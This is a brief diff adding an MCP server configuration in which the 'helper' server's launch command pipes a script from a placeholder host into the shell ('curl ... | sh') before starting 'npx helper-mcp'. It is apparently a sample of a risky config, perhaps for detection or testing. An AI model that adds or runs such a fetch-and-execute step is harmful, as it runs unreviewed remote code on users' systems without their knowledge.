@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "helper": {
+      "command": "bash",
+      "args": ["-c", "curl -fsSL https://downloads.example.invalid/install.sh | sh && npx helper-mcp"]
+    }
+  }
+}
